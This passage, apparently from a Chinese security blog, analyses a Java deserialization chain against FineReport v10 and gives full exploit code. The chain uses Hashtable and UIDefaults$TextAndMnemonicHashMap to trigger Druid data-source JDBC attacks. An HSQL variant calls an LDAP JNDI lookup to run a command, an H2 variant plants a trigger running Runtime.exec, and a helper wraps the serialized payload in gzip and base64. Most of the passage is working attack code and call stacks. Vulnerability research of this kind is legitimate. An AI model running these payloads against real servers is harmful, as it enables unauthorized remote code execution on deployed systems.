textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line"><span class="comment">//        System.out.println(gzipWrapper(payload));</span></span><br><span class="line">        SerializeUtils.unserializeBase64(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="问题一：为什么要设置setter"><a href="#问题一：为什么要设置setter" class="headerlink" title="问题一：为什么要设置setter"></a>问题一：为什么要设置setter</h4><p>setUrl最简单，因为要触发jdbc attack，而其他三个setter的作用则要分析一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">druidXADataSource.setUrl(url);</span><br></pre></td></tr></table></figure><p>setLogWriter(null)、setStatLogger(null)是因为，在DruidXADataSource的对象被序列化的时候，会递归序列化其所有fields，而其中的logWriter和statLogger并未实现Serializable接口，于是在递归序列化的时候报错NoSerializable，设置成null就不会再判断是否可序列化，也就bypass了</p><p>断点打在ObjectOutputStream#1548，条件断点寻找所有未实现Serializable接口的Field：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objVals[i] != null &amp;&amp; (obj.hashCode() == 509886383) &amp;&amp; !(objVals[i] instanceof Serializable)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/88148d3c0a0fb06ce6dfe4928810a7f5.png"></p><p>setInitialSize(1)的原因则和反序列化有关，首先测试可以发现，直接调getXConnection()是可以打通的，但是反序列化调用就打不通了，于是开始对比分析：</p><p>直接 getXConnection 触发jdbc attack的调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getConnectionInternal:<span class="number">1674</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnectionDirect:<span class="number">1504</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1484</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">main:<span class="number">34</span>, h2Attack (org.example)</span><br></pre></td></tr></table></figure><p>而反序列化去触发jdbc attack时，在DruidDataSource#init中，原本在构造函数里初始化了的this.initedLatch变成了null，这导致它在调用await函数时抛出异常<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/13d4416914c282ad6ae1ab5b86649ea7.png"></p><p>而如果this.init()过不去，自然就无法执行到this.getConnectionDirect()，也就导致反序列化无法和直接调用getXConnection一样触发jdbc attack，如下图所示<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c98959e2d1453085e954b78c3e29d3f8.png"></p><p>解决方案是druidXADataSource.setInitialSize(1)，同样是在this.init()函数里，在调用this.initedLatch.await()之前存在下面的代码段，原本这个while循环因为条件不符直接跳过，但是如果设置了initialSize，则可以执行到this.createPhysicalConnection()，<strong>而这个函数同样可以打jdbc attack</strong>（这里比较奇特，不太清楚怎么发现的）<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/22c4a8d04a1723648cebec9db017ba91.png"></p><p>调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">createPhysicalConnection:<span class="number">1694</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">createPhysicalConnection:<span class="number">1794</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">init:<span class="number">936</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1473</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">688</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">772</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeContents:<span class="number">119</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">79</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">18</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">_serialize:<span class="number">479</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">318</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4719</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3964</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">encode:<span class="number">99</span>, EmbedJson (com.fr.json.revise)</span><br><span class="line">encode:<span class="number">560</span>, JSONArray (com.fr.json)</span><br><span class="line">toString:<span class="number">590</span>, JSONArray (com.fr.json)</span><br><span class="line">get:<span class="number">1251</span>, UIDefaults$TextAndMnemonicHashMap (javax.swing)</span><br><span class="line">equals:<span class="number">492</span>, AbstractMap (java.util)</span><br><span class="line">reconstitutionPut:<span class="number">1241</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1215</span>, Hashtable (java.util)</span><br></pre></td></tr></table></figure><h4 id="问题二：为什么Map前后put两次"><a href="#问题二：为什么Map前后put两次" class="headerlink" title="问题二：为什么Map前后put两次"></a>问题二：为什么Map前后put两次</h4><p>和CC7类似，textAndMnemonicHashMap在hashtableput的前后put了两次，并且value先异后同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);  </span><br><span class="line">textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line">...略</span><br><span class="line">hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);  </span><br><span class="line">hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line">...略</span><br><span class="line">textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);  </span><br><span class="line">textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>这样构造本质还是因为hashtable.readObject触发的reconstitutionPut，简单说reconstitutionPut方法就是把一个个反序列化后的Map存入tab，而存入时自然会判断是否有冲突，于是使用hash和equals来做判断，我们利用的也是这个点。</p><p>目标是执行到AbstactMap#equals，但在此之前需要判断e.hash和key.hashCode()是否相等，只有相等才能走到equals<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/108a5bbd5d306a242589c7eb4b4daae1.png"></p><p>而key.hashCode()实际上就是 key.hash ^ value.hash，而e.hash则是上一个存入tab的textAndMnemonicHashMap1的key.hashCode()，那么想执行equals需要两个entry的key和value一致，这解释payload为什么设置两个null。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fe0573e5365ab908406f5381ca9af935.png"></p><p>在设置两个null之前，value先设置成不同的值，则是为避免提前触发链子，因为hashtable在put时会触发同样的equals<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a66400a2ad6bc02c4afa1fd16290a7b.png"></p><h4 id="问题三：为什么设置loadFactor"><a href="#问题三：为什么设置loadFactor" class="headerlink" title="问题三：为什么设置loadFactor"></a>问题三：为什么设置loadFactor</h4><p>因为不加会报错，给出了错误提示0.0<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/14b38698a00b7de4312bc7547742e614.png"><br>这个调试一下就知道了，不加loadFactor没办法反序列化&#x3D; &#x3D;<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fc165e18bc3f42368c6c40195f6d647b.png"></p><h3 id="HashMap链"><a href="#HashMap链" class="headerlink" title="HashMap链"></a>HashMap链</h3><p>略</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="hsql"><a href="#hsql" class="headerlink" title="hsql"></a>hsql</h3><p>v10的最新版默认内置hsql和jdk8u191，所以考虑打hsql jdbc attack，通过调用Java静态函数lookup去打jndi，然后因为是高版本jdk所以再打ldap反序列化，这样反序列化就不受 blacklist.txt 限制，黑名单里随便找个链子反序列化即可。</p><p><strong>坑点：</strong></p><ol><li>指定的hsql数据库的目录必须存在且有权限写文件，并且之前最好没写过数据</li><li>现成工具无法直接利用，因为官方包和fr开头的包不一样，这里魔改 JNDIMap，把fr包打进去实现利用</li><li>最新的v10不带BeanUtils了，这里我用的jackson</li></ol><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HdqlAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapPld</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/Deserialize/FineReportJackson/Command/open .&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;call \&quot;javax.naming.InitialContext.doLookup\&quot;(&#x27;&quot;</span>+ ldapPld + <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:hsqldb:file:/Users/jasper/Downloads/test/&quot;</span>;</span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line"></span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        druidXADataSource.setValidationQuery(query);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line">        druidXADataSource.setDriverClassName(<span class="string">&quot;com.fr.third.org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// druidXADataSource.getXAConnection();</span></span><br><span class="line">        <span class="comment">// 通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">// 即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap的get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">            ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line">        System.out.println(gzipWrapper(payload));</span><br><span class="line"><span class="comment">//        SerializeUtils.unserializeBase64(payload);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d716600ceef9543768c7f24ed3d76387.png"></p><h3 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h3><p>h2 jdbc attack直接rce，直接上exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line">        <span class="comment">//通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">//即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap#get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line"><span class="comment">////        System.out.println(payload);</span></span><br><span class="line">        System.out.println(gzipWrapper(payload));</span><br><span class="line">        SerializeUtils.unserializeBase64(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span 